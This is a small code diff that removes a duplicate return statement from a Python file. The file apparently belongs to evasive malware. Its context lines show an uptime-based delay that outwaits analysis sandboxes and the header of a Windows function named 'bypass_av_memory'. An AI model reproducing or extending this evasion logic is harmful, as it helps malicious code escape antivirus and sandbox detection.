@@ -46,8 +46,6 @@ def check_environment() -> bool:
     if uptime_ms < 120000:
         time.sleep((120000 - uptime_ms) / 1000.0)
     return True
-    
-    return True
 
 def bypass_av_memory():
     if sys.platform != "win32": return
